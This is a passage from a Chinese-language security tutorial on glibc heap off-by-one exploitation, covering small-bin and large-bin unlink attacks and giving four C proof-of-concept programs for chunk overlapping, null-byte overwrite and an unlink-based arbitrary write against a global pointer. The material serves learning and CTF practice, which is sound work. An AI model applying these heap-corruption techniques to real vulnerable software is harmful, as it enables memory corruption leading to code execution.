**off-by-one small bin**
这种方法是要触发unlink宏，因此需要一个指向堆上的指针来绕过fd和bk链表的check。
需要在A块上构造一个伪堆结构，然后覆盖B的pre_size域和inuse域。这样当我们free
B时，就会触发unlink宏导致指向堆上的指针ptr的值被改成&ptr-0xC(x64下为&ptr-0x18)。通过这个特点，我们可以覆写ptr指针，如果条件允许的话，几乎可以造成无限次的write-anything-anywhere。
1\. 在A块中构造伪small bin结构，并且修改B块的prev_size域和inuse域。
2\. free B块
3\. ptr指针被改为&ptr-0xC
**off-by-one large bin**
large bin通过unlink造成write-anything-anywhere的利用方法最早出现于Google的Project
Zero项目的一篇文章中，具体链接是
在这篇文章中，提出了large
bin检验仅仅是通过assert断言的形式来进行的，并不能真正的对漏洞进行有效的防护。但是经过我的测试发现，目前版本的ubuntu和CentOS已经均具备有检测large
unlink的能力，如果发现存在指针被篡改的情况，则会抛出“corrupted double-linked list(not
small)”的错误，之后翻阅了一下glibc中ptmalloc部分的实现代码却并没有发现有检测这部分的代码，猜测大概是后续版本中加入的。因为这种利用方式的意义已经不是很大，这里就不在详细列出步骤也不提供测试DEMO了。
**  
**
**0x07 测试DEMO**
**1.off-by-one overwrite allocated**
    int main(void)
    {
        char buf[253]="";
        void *A,*B,*C;
        void *Overlapped;
        A=malloc(252);
        B=malloc(252);
        C=malloc(128);
        memset(buf,'a',252);
        buf[252]='x89';  //把C块包含进来
        memcpy(A,buf,253);//A存在off-by-one漏洞
        free(B);
        Overlapped=malloc(500);
    }
这段代码演示了通过off-by-one对C块实施了overlapping。通过返回的变量Overlapped就可以对C块进行任意的读写了。
**2.off-by-one overwrite freed**
    int main(void)
    {
        char buf[253]="";
        void *A,*B,*C;
        void *Overlapped;
        A=malloc(252);
        B=malloc(252);
        C=malloc(128);
        free(B);
        memset(buf,'a',252);
        buf[252]='x89';
        memcpy(A,buf,253);//A存在off-by-one漏洞
        Overlapped=malloc(380);
    }
这个DEMO与上面的类似，同样可以overlapping后面的块C，导致可以对C进行任意读写。
**3.off-by-one null byte**
    int main(void)
    {
        void *A,*B,*C;
        void *B1,*B2;
        void *Overlapping;
        A=malloc(0x100);
        B=malloc(0x208);
        C=malloc(0x100);
        free(B);
        ((char *)A)[0x104]='x00';
        B1=malloc(0x100);
        B2=malloc(0x80);
        free(B1);
        free(C);
        malloc(0x200);   
    }
可以成功的对B2进行任意读写。
**4.off-by-one small bin**
    void *ptr;
    int main(void)
    {
        int prev_size,size,fd,bk;
        void *p1,*p2;
        char buf[253]="";
        p1=malloc(252);
        p2=malloc(252);
        ptr=p1;
        prev_size=0;
        size=249;
        fd=(int)(&ptr)-0xC;
        bk=(int)(&ptr)-0x8;
        memset(buf,'c',253);
        memcpy(buf,&prev_size,4);
        memcpy(buf+4,&size,4);
        memcpy(buf+8,&fd,4);
        memcpy(buf+12,&bk,4);
        size=248;
        memcpy(&buf[248],&size,4);
        buf[252]='x00';
        memcpy(p1,buf,253);
        free(p2);
    }
这个DEMO中使用了一个指向堆上的指针ptr，ptr是全局变量处于bss段上。通过重复写ptr值即可实现write-anything-anywhere。
**  
**
**0x08 后记**
这是本人第一次投稿原创文章，之前只是写写博客。文笔不好，错误也在所难免，希望大家包容下。
参考文档：
[CTF中的内存漏洞利用技巧 -清华大学网络与信息安全实验室 ](http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf)
[Google Project Zero Blog](https://googleprojectzero.blogspot.com/)
[glibc_malloc from github ](https://github.com/lattera/glibc)
[Glibc Adventures: The Forgotten Chunks
](https://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf)